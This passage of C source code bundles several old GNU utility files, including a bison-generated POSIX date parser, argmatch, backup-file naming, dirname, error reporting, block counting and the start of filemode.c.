     so that they stay on the same level as the state stack.
     The wasted elements are never initialized.  */

  zzssp = zzss - 1;
  zzvsp = zzvs;
#ifdef YYLSP_NEEDED
  zzlsp = zzls;
#endif

/* Push a new state, which is found in  zzstate  .  */
/* In all cases, when you get here, the value and location stacks
   have just been pushed. so pushing a state here evens the stacks.  */
zznewstate:

  *++zzssp = zzstate;

  if (zzssp >= zzss + zzstacksize - 1)
    {
      /* Give user a chance to reallocate the stack */
      /* Use copies of these so that the &'s don't force the real ones into memory. */
      YYSTYPE *zzvs1 = zzvs;
      short *zzss1 = zzss;
#ifdef YYLSP_NEEDED
      YYLTYPE *zzls1 = zzls;
#endif

      /* Get the current used size of the three stacks, in elements.  */
      int size = zzssp - zzss + 1;

#ifdef zzoverflow
      /* Each stack pointer address is followed by the size of
	 the data in use in that stack, in bytes.  */
#ifdef YYLSP_NEEDED
      /* This used to be a conditional around just the two extra args,
	 but that might be undefined if zzoverflow is a macro.  */
      zzoverflow("parser stack overflow",
		 &zzss1, size * sizeof (*zzssp),
		 &zzvs1, size * sizeof (*zzvsp),
		 &zzls1, size * sizeof (*zzlsp),
		 &zzstacksize);
#else
      zzoverflow("parser stack overflow",
		 &zzss1, size * sizeof (*zzssp),
		 &zzvs1, size * sizeof (*zzvsp),
		 &zzstacksize);
#endif

      zzss = zzss1; zzvs = zzvs1;
#ifdef YYLSP_NEEDED
      zzls = zzls1;
#endif
#else /* no zzoverflow */
      /* Extend the stack our own way.  */
      if (zzstacksize >= YYMAXDEPTH)
	{
	  zzerror("parser stack overflow");
	  return 2;
	}
      zzstacksize *= 2;
      if (zzstacksize > YYMAXDEPTH)
	zzstacksize = YYMAXDEPTH;
      zzss = (short *) alloca (zzstacksize * sizeof (*zzssp));
      __zz_memcpy ((char *)zzss, (char *)zzss1, size * sizeof (*zzssp));
      zzvs = (YYSTYPE *) alloca (zzstacksize * sizeof (*zzvsp));
      __zz_memcpy ((char *)zzvs, (char *)zzvs1, size * sizeof (*zzvsp));
#ifdef YYLSP_NEEDED
      zzls = (YYLTYPE *) alloca (zzstacksize * sizeof (*zzlsp));
      __zz_memcpy ((char *)zzls, (char *)zzls1, size * sizeof (*zzlsp));
#endif
#endif /* no zzoverflow */

      zzssp = zzss + size - 1;
      zzvsp = zzvs + size - 1;
#ifdef YYLSP_NEEDED
      zzlsp = zzls + size - 1;
#endif

#if YYDEBUG != 0
      if (zzdebug)
	fprintf(stderr, "Stack size increased to %d\n", zzstacksize);
#endif

      if (zzssp >= zzss + zzstacksize - 1)
	YYABORT;
    }

#if YYDEBUG != 0
  if (zzdebug)
    fprintf(stderr, "Entering state %d\n", zzstate);
#endif

  goto zzbackup;
 zzbackup:

/* Do appropriate processing given the current state.  */
/* Read a lookahead token if we need one and don't already have one.  */
/* zzresume: */

  /* First try to decide what to do without reference to lookahead token.  */

  zzn = zzpact[zzstate];
  if (zzn == YYFLAG)
    goto zzdefault;

  /* Not known => get a lookahead token if don't already have one.  */

  /* zzchar is either YYEMPTY or YYEOF
     or a valid token in external form.  */

  if (zzchar == YYEMPTY)
    {
#if YYDEBUG != 0
      if (zzdebug)
	fprintf(stderr, "Reading a token: ");
#endif
      zzchar = YYLEX;
    }

  /* Convert token to internal form (in zzchar1) for indexing tables with */

  if (zzchar <= 0)		/* This means end of input. */
    {
      zzchar1 = 0;
      zzchar = YYEOF;		/* Don't call YYLEX any more */

#if YYDEBUG != 0
      if (zzdebug)
	fprintf(stderr, "Now at end of input.\n");
#endif
    }
  else
    {
      zzchar1 = YYTRANSLATE(zzchar);

#if YYDEBUG != 0
      if (zzdebug)
	{
	  fprintf (stderr, "Next token is %d (%s", zzchar, zztname[zzchar1]);
	  /* Give the individual parser a way to print the precise meaning
	     of a token, for further debugging info.  */
#ifdef YYPRINT
	  YYPRINT (stderr, zzchar, zzlval);
#endif
	  fprintf (stderr, ")\n");
	}
#endif
    }

  zzn += zzchar1;
  if (zzn < 0 || zzn > YYLAST || zzcheck[zzn] != zzchar1)
    goto zzdefault;

  zzn = zztable[zzn];

  /* zzn is what to do for this token type in this state.
     Negative => reduce, -zzn is rule number.
     Positive => shift, zzn is new state.
       New state is final state => don't bother to shift,
       just return success.
     0, or most negative number => error.  */

  if (zzn < 0)
    {
      if (zzn == YYFLAG)
	goto zzerrlab;
      zzn = -zzn;
      goto zzreduce;
    }
  else if (zzn == 0)
    goto zzerrlab;

  if (zzn == YYFINAL)
    YYACCEPT;

  /* Shift the lookahead token.  */

#if YYDEBUG != 0
  if (zzdebug)
    fprintf(stderr, "Shifting token %d (%s), ", zzchar, zztname[zzchar1]);
#endif

  /* Discard the token being shifted unless it is eof.  */
  if (zzchar != YYEOF)
    zzchar = YYEMPTY;

  *++zzvsp = zzlval;
#ifdef YYLSP_NEEDED
  *++zzlsp = zzlloc;
#endif

  /* count tokens shifted since error; after three, turn off error status.  */
  if (zzerrstatus) zzerrstatus--;

  zzstate = zzn;
  goto zznewstate;

/* Do the default action for the current state.  */
zzdefault:

  zzn = zzdefact[zzstate];
  if (zzn == 0)
    goto zzerrlab;

/* Do a reduction.  zzn is the number of a rule to reduce with.  */
zzreduce:
  zzlen = zzr2[zzn];
  if (zzlen > 0)
    zzval = zzvsp[1-zzlen]; /* implement default value of the action */

#if YYDEBUG != 0
  if (zzdebug)
    {
      int i;

      fprintf (stderr, "Reducing via rule %d (line %d), ",
	       zzn, zzrline[zzn]);

      /* Print the symbols being reduced, and their result.  */
      for (i = zzprhs[zzn]; zzrhs[i] > 0; i++)
	fprintf (stderr, "%s ", zztname[zzrhs[i]]);
      fprintf (stderr, " -> %s\n", zztname[zzr1[zzn]]);
    }
#endif


  switch (zzn) {

case 1:
#line 84 "./posixtm.y"
{
	         if (zzvsp[-5] >= 1 && zzvsp[-5] <= 12)
		   t.tm_mon = zzvsp[-5] - 1;
		 else {
		   YYABORT;
		 }
		 if (zzvsp[-4] >= 1 && zzvsp[-4] <= 31)
		   t.tm_mday = zzvsp[-4];
		 else {
		   YYABORT;
		 }
		 if (zzvsp[-3] >= 0 && zzvsp[-3] <= 23)
		   t.tm_hour = zzvsp[-3];
		 else {
		   YYABORT;
		 }
		 if (zzvsp[-2] >= 0 && zzvsp[-2] <= 59)
		   t.tm_min = zzvsp[-2];
		 else {
		   YYABORT;
		 }
	       ;
    break;}
case 2:
#line 107 "./posixtm.y"
{
                   t.tm_year = zzvsp[0];
		   /* Deduce the century based on the year.
		      See POSIX.2 section 4.63.3.  */
		   if (zzvsp[0] <= 68)
		     t.tm_year += 100;
		 ;
    break;}
case 3:
#line 114 "./posixtm.y"
{
                            t.tm_year = zzvsp[-1] * 100 + zzvsp[0];
			    if (t.tm_year < 1900) {
			      YYABORT;
			    } else
			      t.tm_year -= 1900;
			  ;
    break;}
case 4:
#line 121 "./posixtm.y"
{
                    time_t now;
		    struct tm *tmp;

                    /* Use current year.  */
                    time (&now);
		    tmp = localtime (&now);
		    t.tm_year = tmp->tm_year;
		  ;
    break;}
case 5:
#line 132 "./posixtm.y"
{
                        t.tm_sec = 0;
		      ;
    break;}
case 6:
#line 135 "./posixtm.y"
{
	                  if (zzvsp[0] >= 0 && zzvsp[0] <= 61)
			    t.tm_sec = zzvsp[0];
			  else {
			    YYABORT;
			  }
			;
    break;}
case 7:
#line 144 "./posixtm.y"
{
                          zzval = zzvsp[-1] * 10 + zzvsp[0];
			;
    break;}
}
   /* the action file gets copied in in place of this dollarsign */
#line 498 "/p/share/bison.simple"

  zzvsp -= zzlen;
  zzssp -= zzlen;
#ifdef YYLSP_NEEDED
  zzlsp -= zzlen;
#endif

#if YYDEBUG != 0
  if (zzdebug)
    {
      short *ssp1 = zzss - 1;
      fprintf (stderr, "state stack now");
      while (ssp1 != zzssp)
	fprintf (stderr, " %d", *++ssp1);
      fprintf (stderr, "\n");
    }
#endif

  *++zzvsp = zzval;

#ifdef YYLSP_NEEDED
  zzlsp++;
  if (zzlen == 0)
    {
      zzlsp->first_line = zzlloc.first_line;
      zzlsp->first_column = zzlloc.first_column;
      zzlsp->last_line = (zzlsp-1)->last_line;
      zzlsp->last_column = (zzlsp-1)->last_column;
      zzlsp->text = 0;
    }
  else
    {
      zzlsp->last_line = (zzlsp+zzlen-1)->last_line;
      zzlsp->last_column = (zzlsp+zzlen-1)->last_column;
    }
#endif

  /* Now "shift" the result of the reduction.
     Determine what state that goes to,
     based on the state we popped back to
     and the rule number reduced by.  */

  zzn = zzr1[zzn];

  zzstate = zzpgoto[zzn - YYNTBASE] + *zzssp;
  if (zzstate >= 0 && zzstate <= YYLAST && zzcheck[zzstate] == *zzssp)
    zzstate = zztable[zzstate];
  else
    zzstate = zzdefgoto[zzn - YYNTBASE];

  goto zznewstate;

zzerrlab:   /* here on detecting error */

  if (! zzerrstatus)
    /* If not already recovering from an error, report this error.  */
    {
      ++zznerrs;

#ifdef YYERROR_VERBOSE
      zzn = zzpact[zzstate];

      if (zzn > YYFLAG && zzn < YYLAST)
	{
	  int size = 0;
	  char *msg;
	  int x, count;

	  count = 0;
	  /* Start X at -zzn if nec to avoid negative indexes in zzcheck.  */
	  for (x = (zzn < 0 ? -zzn : 0);
	       x < (sizeof(zztname) / sizeof(char *)); x++)
	    if (zzcheck[x + zzn] == x)
	      size += strlen(zztname[x]) + 15, count++;
	  msg = (char *) malloc(size + 15);
	  if (msg != 0)
	    {
	      strcpy(msg, "parse error");

	      if (count < 5)
		{
		  count = 0;
		  for (x = (zzn < 0 ? -zzn : 0);
		       x < (sizeof(zztname) / sizeof(char *)); x++)
		    if (zzcheck[x + zzn] == x)
		      {
			strcat(msg, count == 0 ? ", expecting `" : " or `");
			strcat(msg, zztname[x]);
			strcat(msg, "'");
			count++;
		      }
		}
	      zzerror(msg);
	      free(msg);
	    }
	  else
	    zzerror ("parse error; also virtual memory exceeded");
	}
      else
#endif /* YYERROR_VERBOSE */
	zzerror("parse error");
    }

  goto zzerrlab1;
zzerrlab1:   /* here on error raised explicitly by an action */

  if (zzerrstatus == 3)
    {
      /* if just tried and failed to reuse lookahead token after an error, discard it.  */

      /* return failure if at end of input */
      if (zzchar == YYEOF)
	YYABORT;

#if YYDEBUG != 0
      if (zzdebug)
	fprintf(stderr, "Discarding token %d (%s).\n", zzchar, zztname[zzchar1]);
#endif

      zzchar = YYEMPTY;
    }

  /* Else will try to reuse lookahead token
     after shifting the error token.  */

  zzerrstatus = 3;		/* Each real token shifted decrements this */

  goto zzerrhandle;

zzerrdefault:  /* current state does not do anything special for the error token. */

#if 0
  /* This is wrong; only states that explicitly want error tokens
     should shift them.  */
  zzn = zzdefact[zzstate];  /* If its default is to accept any token, ok.  Otherwise pop it.*/
  if (zzn) goto zzdefault;
#endif

zzerrpop:   /* pop the current state because it cannot handle the error token */

  if (zzssp == zzss) YYABORT;
  zzvsp--;
  zzstate = *--zzssp;
#ifdef YYLSP_NEEDED
  zzlsp--;
#endif

#if YYDEBUG != 0
  if (zzdebug)
    {
      short *ssp1 = zzss - 1;
      fprintf (stderr, "Error: state stack now");
      while (ssp1 != zzssp)
	fprintf (stderr, " %d", *++ssp1);
      fprintf (stderr, "\n");
    }
#endif

zzerrhandle:

  zzn = zzpact[zzstate];
  if (zzn == YYFLAG)
    goto zzerrdefault;

  zzn += YYTERROR;
  if (zzn < 0 || zzn > YYLAST || zzcheck[zzn] != YYTERROR)
    goto zzerrdefault;

  zzn = zztable[zzn];
  if (zzn < 0)
    {
      if (zzn == YYFLAG)
	goto zzerrpop;
      zzn = -zzn;
      goto zzreduce;
    }
  else if (zzn == 0)
    goto zzerrpop;

  if (zzn == YYFINAL)
    YYACCEPT;

#if YYDEBUG != 0
  if (zzdebug)
    fprintf(stderr, "Shifting error token, ");
#endif

  *++zzvsp = zzlval;
#ifdef YYLSP_NEEDED
  *++zzlsp = zzlloc;
#endif

  zzstate = zzn;
  goto zznewstate;
}
#line 148 "./posixtm.y"

static int
zzlex ()
{
  char ch = *curpos++;

  if (ch >= '0' && ch <= '9')
    {
      zzlval = ch - '0';
      return DIGIT;
    }
  else if (ch == '.' || ch == 0)
    return ch;
  else
    return '?';			/* Cause an error.  */
}

static int
zzerror ()
{
  return 0;
}

/* Parse a POSIX-style date and return it, or (time_t)-1 for an error.  */

time_t
posixtime (s)
     char *s;
{
  curpos = s;
  /* Let mktime decide whether it is daylight savings time.  */
  t.tm_isdst = -1;
  if (zzparse ())
    return (time_t)-1;
  else
    return mktime (&t);
}

/* Parse a POSIX-style date and return it, or NULL for an error.  */

struct tm *
posixtm (s)
     char *s;
{
  if (posixtime (s) == -1)
    return NULL;
  return &t;
}
/* argmatch.c -- find a match for a string in an array
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie <djm@ai.mit.edu> */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>

#include <stdio.h>
#ifdef STDC_HEADERS
#include <string.h>
#endif

extern char *program_name;

/* If ARG is an unambiguous match for an element of the
   null-terminated array OPTLIST, return the index in OPTLIST
   of the matched element, else -1 if it does not match any element
   or -2 if it is ambiguous (is a prefix of more than one element).  */

int
argmatch (arg, optlist)
     const char *arg;
     const char *const *optlist;
{
  int i;			/* Temporary index in OPTLIST.  */
  size_t arglen;		/* Length of ARG.  */
  int matchind = -1;		/* Index of first nonexact match.  */
  int ambiguous = 0;		/* If nonzero, multiple nonexact match(es).  */

  arglen = strlen (arg);

  /* Test all elements for either exact match or abbreviated matches.  */
  for (i = 0; optlist[i]; i++)
    {
      if (!strncmp (optlist[i], arg, arglen))
	{
	  if (strlen (optlist[i]) == arglen)
	    /* Exact match found.  */
	    return i;
	  else if (matchind == -1)
	    /* First nonexact match found.  */
	    matchind = i;
	  else
	    /* Second nonexact match found.  */
	    ambiguous = 1;
	}
    }
  if (ambiguous)
    return -2;
  else
    return matchind;
}

/* Error reporting for argmatch.
   KIND is a description of the type of entity that was being matched.
   VALUE is the invalid value that was given.
   PROBLEM is the return value from argmatch.  */

void
invalid_arg (kind, value, problem)
     const char *kind;
     const char *value;
     int problem;
{
  fprintf (stderr, "%s: ", program_name);
  if (problem == -1)
    fprintf (stderr, "invalid");
  else				/* Assume -2.  */
    fprintf (stderr, "ambiguous");
  fprintf (stderr, " %s `%s'\n", kind, value);
}
/* backupfile.c -- make Emacs style backup file names
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* David MacKenzie <djm@gnu.ai.mit.edu>.
   Some algorithms adapted from GNU Emacs. */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <stdio.h>
#include <ctype.h>
#include <sys/types.h>
#include "backupfile.h"
#ifdef HAVE_STRING_H
# include <string.h>
#else
# include <strings.h>
#endif

#ifdef HAVE_DIRENT_H
# include <dirent.h>
# define NLENGTH(direct) (strlen((direct)->d_name))
#else /* not HAVE_DIRENT_H */
# define dirent direct
# define NLENGTH(direct) ((direct)->d_namlen)
# ifdef HAVE_SYS_NDIR_H
#  include <sys/ndir.h>
# endif /* HAVE_SYS_NDIR_H */
# ifdef HAVE_SYS_DIR_H
#  include <sys/dir.h>
# endif /* HAVE_SYS_DIR_H */
# ifdef HAVE_NDIR_H
#  include <ndir.h>
# endif /* HAVE_NDIR_H */
#endif /* HAVE_DIRENT_H */

#ifdef CLOSEDIR_VOID
/* Fake a return value. */
# define CLOSEDIR(d) (closedir (d), 0)
#else
# define CLOSEDIR(d) closedir (d)
#endif

#ifdef STDC_HEADERS
# include <stdlib.h>
#else
char *malloc ();
#endif

#if defined (STDC_HEADERS) || (!defined (isascii) && !defined (HAVE_ISASCII))
# define IN_CTYPE_DOMAIN(c) 1
#else
# define IN_CTYPE_DOMAIN(c) isascii(c)
#endif

#define ISDIGIT(c) (IN_CTYPE_DOMAIN ((unsigned char) (c)) \
		    && isdigit ((unsigned char) (c)))

#if defined (HAVE_UNISTD_H)
#include <unistd.h>
#endif

#if defined (_POSIX_VERSION)
/* POSIX does not require that the d_ino field be present, and some
   systems do not provide it. */
# define REAL_DIR_ENTRY(dp) 1
#else
# define REAL_DIR_ENTRY(dp) ((dp)->d_ino != 0)
#endif

/* Which type of backup file names are generated. */
enum backup_type backup_type = none;

/* The extension added to file names to produce a simple (as opposed
   to numbered) backup file name. */
char *simple_backup_suffix = "~";

char *basename ();
char *dirname ();
static char *concat ();
char *find_backup_file_name ();
static char *make_version_name ();
static int max_backup_version ();
static int version_number ();

/* Return the name of the new backup file for file FILE,
   allocated with malloc.  Return 0 if out of memory.
   FILE must not end with a '/' unless it is the root directory.
   Do not call this function if backup_type == none. */

char *
find_backup_file_name (file)
     const char *file;
{
  char *dir;
  char *base_versions;
  int highest_backup;

  if (backup_type == simple)
    return concat (file, simple_backup_suffix);
  base_versions = concat (basename (file), ".~");
  if (base_versions == 0)
    return 0;
  dir = dirname (file);
  if (dir == 0)
    {
      free (base_versions);
      return 0;
    }
  highest_backup = max_backup_version (base_versions, dir);
  free (base_versions);
  free (dir);
  if (backup_type == numbered_existing && highest_backup == 0)
    return concat (file, simple_backup_suffix);
  return make_version_name (file, highest_backup + 1);
}

/* Return the number of the highest-numbered backup file for file
   FILE in directory DIR.  If there are no numbered backups
   of FILE in DIR, or an error occurs reading DIR, return 0.
   FILE should already have ".~" appended to it. */

static int
max_backup_version (file, dir)
     const char *file;
     const char *dir;
{
  DIR *dirp;
  struct dirent *dp;
  int highest_version;
  int this_version;
  size_t file_name_length;

  dirp = opendir (dir);
  if (!dirp)
    return 0;

  highest_version = 0;
  file_name_length = strlen (file);

  while ((dp = readdir (dirp)) != 0)
    {
      if (!REAL_DIR_ENTRY (dp) || NLENGTH (dp) <= file_name_length)
	continue;

      this_version = version_number (file, dp->d_name, file_name_length);
      if (this_version > highest_version)
	highest_version = this_version;
    }
  if (CLOSEDIR (dirp))
    return 0;
  return highest_version;
}

/* Return a string, allocated with malloc, containing
   "FILE.~VERSION~".  Return 0 if out of memory. */

static char *
make_version_name (file, version)
     const char *file;
     int version;
{
  char *backup_name;

  backup_name = malloc (strlen (file) + 16);
  if (backup_name == 0)
    return 0;
  sprintf (backup_name, "%s.~%d~", file, version);
  return backup_name;
}

/* If BACKUP is a numbered backup of BASE, return its version number;
   otherwise return 0.  BASE_LENGTH is the length of BASE.
   BASE should already have ".~" appended to it. */

static int
version_number (base, backup, base_length)
     const char *base;
     const char *backup;
     int base_length;
{
  int version;
  const char *p;

  version = 0;
  if (!strncmp (base, backup, base_length) && ISDIGIT (backup[base_length]))
    {
      for (p = &backup[base_length]; ISDIGIT (*p); ++p)
	version = version * 10 + *p - '0';
      if (p[0] != '~' || p[1])
	version = 0;
    }
  return version;
}

/* Return the newly-allocated concatenation of STR1 and STR2.
   If out of memory, return 0. */

static char *
concat (str1, str2)
     const char *str1;
     const char *str2;
{
  char *newstr;
  int str1_length = strlen (str1);

  newstr = malloc (str1_length + strlen (str2) + 1);
  if (newstr == 0)
    return 0;
  strcpy (newstr, str1);
  strcpy (newstr + str1_length, str2);
  return newstr;
}
/* dirname.c -- return all but the last element in a path
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#else
char *malloc ();
#endif
#if defined(STDC_HEADERS) || defined(HAVE_STRING_H)
#include <string.h>
#else
#include <strings.h>
#ifndef strrchr
#define strrchr rindex
#endif
#endif

/* Return the leading directories part of PATH,
   allocated with malloc.  If out of memory, return 0.
   Assumes that trailing slashes have already been
   removed.  */

char *
dirname (path)
     char *path;
{
  char *newpath;
  char *slash;
  int length;			/* Length of result, not including NUL.  */

  slash = strrchr (path, '/');
  if (slash == 0)
    {
      /* File is in the current directory.  */
      path = ".";
      length = 1;
    }
  else
    {
      /* Remove any trailing slashes from the result.  */
      while (slash > path && *slash == '/')
	--slash;

      length = slash - path + 1;
    }
  newpath = (char *) malloc (length + 1);
  if (newpath == 0)
    return 0;
  strncpy (newpath, path, length);
  newpath[length] = 0;
  return newpath;
}
/* error.c -- error handler for noninteractive utilities
   Copyright (C) 1990, 91, 92, 93, 94, 95, 96 Free Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

/* Written by David MacKenzie <djm@gnu.ai.mit.edu>.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <stdio.h>

#if HAVE_VPRINTF || HAVE_DOPRNT || _LIBC
# if __STDC__
#  include <stdarg.h>
#  define VA_START(args, lastarg) va_start(args, lastarg)
# else
#  include <varargs.h>
#  define VA_START(args, lastarg) va_start(args)
# endif
#else
# define va_alist a1, a2, a3, a4, a5, a6, a7, a8
# define va_dcl char *a1, *a2, *a3, *a4, *a5, *a6, *a7, *a8;
#endif

#if STDC_HEADERS || _LIBC
# include <stdlib.h>
# include <string.h>
#else
void exit ();
#endif

#ifndef _
# define _(String) String
#endif

/* If NULL, error will flush stdout, then print on stderr the program
   name, a colon and a space.  Otherwise, error will call this
   function without parameters instead.  */
void (*error_print_progname) (
#if __STDC__ - 0
			      void
#endif
			      );

/* This variable is incremented each time `error' is called.  */
unsigned int error_message_count;

#ifdef _LIBC
/* In the GNU C library, there is a predefined variable for this.  */

# define program_name program_invocation_name
# include <errno.h>

#else

/* The calling program should define program_name and set it to the
   name of the executing program.  */
extern char *program_name;

# if HAVE_STRERROR
#  ifndef strerror		/* On some systems, strerror is a macro */
char *strerror ();
#  endif
# else
static char *
private_strerror (errnum)
     int errnum;
{
  extern char *sys_errlist[];
  extern int sys_nerr;

  if (errnum > 0 && errnum <= sys_nerr)
    return sys_errlist[errnum];
  return _("Unknown system error");
}
#  define strerror private_strerror
# endif	/* HAVE_STRERROR */
#endif	/* _LIBC */

/* Print the program name and error message MESSAGE, which is a printf-style
   format string with optional args.
   If ERRNUM is nonzero, print its corresponding system error message.
   Exit with status STATUS if it is nonzero.  */
/* VARARGS */

void
#if defined(VA_START) && __STDC__
error (int status, int errnum, const char *message, ...)
#else
error (status, errnum, message, va_alist)
     int status;
     int errnum;
     char *message;
     va_dcl
#endif
{
#ifdef VA_START
  va_list args;
#endif

  if (error_print_progname)
    (*error_print_progname) ();
  else
    {
      fflush (stdout);
      fprintf (stderr, "%s: ", program_name);
    }

#ifdef VA_START
  VA_START (args, message);
# if HAVE_VPRINTF || _LIBC
  vfprintf (stderr, message, args);
# else
  _doprnt (message, args, stderr);
# endif
  va_end (args);
#else
  fprintf (stderr, message, a1, a2, a3, a4, a5, a6, a7, a8);
#endif

  ++error_message_count;
  if (errnum)
    fprintf (stderr, ": %s", strerror (errnum));
  putc ('\n', stderr);
  fflush (stderr);
  if (status)
    exit (status);
}

/* Sometimes we want to have at most one error per line.  This
   variable controls whether this mode is selected or not.  */
int error_one_per_line;

void
#if defined(VA_START) && __STDC__
error_at_line (int status, int errnum, const char *file_name,
	       unsigned int line_number, const char *message, ...)
#else
error_at_line (status, errnum, file_name, line_number, message, va_alist)
     int status;
     int errnum;
     const char *file_name;
     unsigned int line_number;
     char *message;
     va_dcl
#endif
{
#ifdef VA_START
  va_list args;
#endif

  if (error_one_per_line)
    {
      static const char *old_file_name;
      static unsigned int old_line_number;

      if (old_line_number == line_number &&
	  (file_name == old_file_name || !strcmp (old_file_name, file_name)))
	/* Simply return and print nothing.  */
	return;

      old_file_name = file_name;
      old_line_number = line_number;
    }

  if (error_print_progname)
    (*error_print_progname) ();
  else
    {
      fflush (stdout);
      fprintf (stderr, "%s:", program_name);
    }

  if (file_name != NULL)
    fprintf (stderr, "%s:%d: ", file_name, line_number);

#ifdef VA_START
  VA_START (args, message);
# if HAVE_VPRINTF || _LIBC
  vfprintf (stderr, message, args);
# else
  _doprnt (message, args, stderr);
# endif
  va_end (args);
#else
  fprintf (stderr, message, a1, a2, a3, a4, a5, a6, a7, a8);
#endif

  ++error_message_count;
  if (errnum)
    fprintf (stderr, ": %s", strerror (errnum));
  putc ('\n', stderr);
  fflush (stderr);
  if (status)
    exit (status);
}
/* Convert file size to number of blocks on System V-like machines.
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

/* Written by Brian L. Matthews, blm@6sceng.UUCP. */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#if !defined (HAVE_ST_BLOCKS) && !defined(_POSIX_VERSION)
# include <sys/types.h>
# include <sys/param.h>

# ifndef NINDIR
/* Some SysV's, like Irix, seem to lack these.  Hope they're correct. */
/* Size of a indirect block, in bytes. */
#  ifndef BSIZE
#   define BSIZE 1024
#  endif

/* Number of inode pointers per indirect block. */
#  define NINDIR (BSIZE/sizeof(daddr_t))
# endif /* !NINDIR */

/* Number of direct block addresses in an inode. */
# define NDIR	10

/* Return the number of 512-byte blocks in a file of SIZE bytes. */

long
st_blocks (size)
     long size;
{
  long datablks = (size + 512 - 1) / 512;
  long indrblks = 0;

  if (datablks > NDIR)
    {
      indrblks = (datablks - NDIR - 1) / NINDIR + 1;

      if (datablks > NDIR + NINDIR)
	{
	  indrblks += (datablks - NDIR - NINDIR - 1) / (NINDIR * NINDIR) + 1;

	  if (datablks > NDIR + NINDIR + NINDIR * NINDIR)
	    indrblks++;
	}
    }

  return datablks + indrblks;
}
#else
/* This declaration is solely to ensure that after preprocessing
   this file is never empty.  */
extern int textutils_fileblocks_unused;
#endif
/* filemode.c -- make a string describing file modes
   Copyright (C) 1985, 1990, 1993 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>

#if !S_IRUSR
# if S_IREAD
#  define S_IRUSR S_IREAD
# else
#  define S_IRUSR 00400
# endif
#endif

#if !S_IWUSR
# if S_IWRITE
#  define S_IWUSR S_IWRITE
# else
#  define S_IWUSR 00200
# endif
#endif

#if !S_IXUSR
# if S_IEXEC
#  define S_IXUSR S_IEXEC
# else
#  define S_IXUSR 00100
# endif
#endif

#ifdef STAT_MACROS_BROKEN
#undef S_ISBLK
#undef S_ISCHR
#undef S_ISDIR
#undef S_ISFIFO
#undef S_ISLNK
#undef S_ISMPB
#undef S_ISMPC
#undef S_ISNWK
#undef S_ISREG
#undef S_ISSOCK
#endif /* STAT_MACROS_BROKEN.  */

#if !defined(S_ISBLK) && defined(S_IFBLK)
#define S_ISBLK(m) (((m) & S_IFMT) == S_IFBLK)
#endif
#if !defined(S_ISCHR) && defined(S_IFCHR)
#define S_ISCHR(m) (((m) & S_IFMT) == S_IFCHR)
#endif
#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif
#if !defined(S_ISREG) && defined(S_IFREG)
#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)
#endif
#if !defined(S_ISFIFO) && defined(S_IFIFO)
#define S_ISFIFO(m) (((m) & S_IFMT) == S_IFIFO)
#endif
#if !defined(S_ISLNK) && defined(S_IFLNK)
#define S_ISLNK(m) (((m) & S_IFMT) == S_IFLNK)
#endif
#if !defined(S_ISSOCK) && defined(S_IFSOCK)
